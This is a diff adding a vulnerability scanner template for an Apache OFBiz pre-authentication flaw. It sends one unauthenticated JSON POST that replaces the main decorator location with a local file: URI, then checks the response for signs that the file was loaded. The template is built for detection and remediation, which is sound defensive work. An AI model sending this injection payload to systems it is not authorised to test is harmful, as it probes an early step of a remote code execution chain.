@@ -1,0 +1,54 @@
+id: CVE-2026-68524
+
+info:
+  name: Apache OFBiz - Pre-Authentication File URI Screen Loading
+  author: alex700
+  severity: high
+  description: |
+    Apache OFBiz before 24.09.08 permits an unauthenticated JSON request body to
+    replace the configured main decorator location with a file URI. This template
+    checks whether Web Tools loads its own installed screen through a local file
+    URI. It does not execute commands or prove the temporary-file exploit chain.
+  impact: |
+    The unsafe screen-loading behavior can form part of the pre-authentication
+    remote code execution chain described in CVE-2026-68524.
+  remediation: |
+    Upgrade Apache OFBiz to 24.09.08 or later.
+  reference:
+    - https://ofbiz.apache.org/security.html
+    - https://www.openwall.com/lists/oss-security/2026/11/04/9
+    - https://github.com/apache/ofbiz-framework/pull/1528
+    - https://github.com/apache/ofbiz-framework/pull/1654
+    - https://raw.githubusercontent.com/CVEProject/cvelistV5/main/cves/2026/68xxx/CVE-2026-68524.json
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-68524
+  classification:
+    cve-id: CVE-2026-68524
+    cwe-id: CWE-94
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: apache
+    product: ofbiz
+  tags: cve,cve2026,apache,ofbiz,rce,linux
+
+http:
+  - raw:
+      - |
+        POST /webtools/control/main HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"mainDecoratorLocation":"file:/proc/self/cwd/framework/webtools/widget/CommonScreens.xml"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - '<!-- Begin section widgetcomponent://webtools/widget/CommonScreens.xml#main '
+          - '<!-- Begin section widgetfile:/proc/self/cwd/framework/webtools/widget/CommonScreens.xml#main-decorator '
+        condition: and
